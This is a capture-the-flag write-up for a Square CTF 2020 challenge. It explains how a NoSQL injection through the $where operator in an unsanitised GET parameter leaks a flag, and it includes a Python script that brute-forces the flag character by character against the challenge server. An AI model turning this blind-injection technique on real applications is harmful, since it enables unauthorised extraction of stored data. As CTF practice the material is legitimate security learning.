We are able to exploit a noSQL injection via an unsanitised get parameter.

We use the top level operator $where in order to evaluate JS code and brute force characters of the flag.

I crafted the exploit string after trying a few things for a while.

```python
import requests as r
import string

alph = string.ascii_lowercase + string.digits
flag = "flag{"
url = "http://challenges.2020.squarectf.com:9542/api/posts?$where="

for i in range(5,40):
    for c in alph:
        res = r.get(url+"try{{if (this.flag.charAt(%i).toLowerCase() == '%s') {{return true}}}}catch{{}}" % (i, c))
        print(url+"try{{if (this.flag.charAt(%i).toLowerCase() == '%s') {{return true}}}}catch{{}}" % (i, c))

        if res.content.decode('ascii') == '[]':
            continue

        res = r.get(url+"try{{if (this.flag.charAt(%i) == '%s') {{return true}}}}catch{{}}" % (i, c.upper()))

        if res.content.decode('ascii') == '[]':
            flag += c
            print(flag)
            break
        else:
            flag += c.upper()
            print(flag)
            break
```

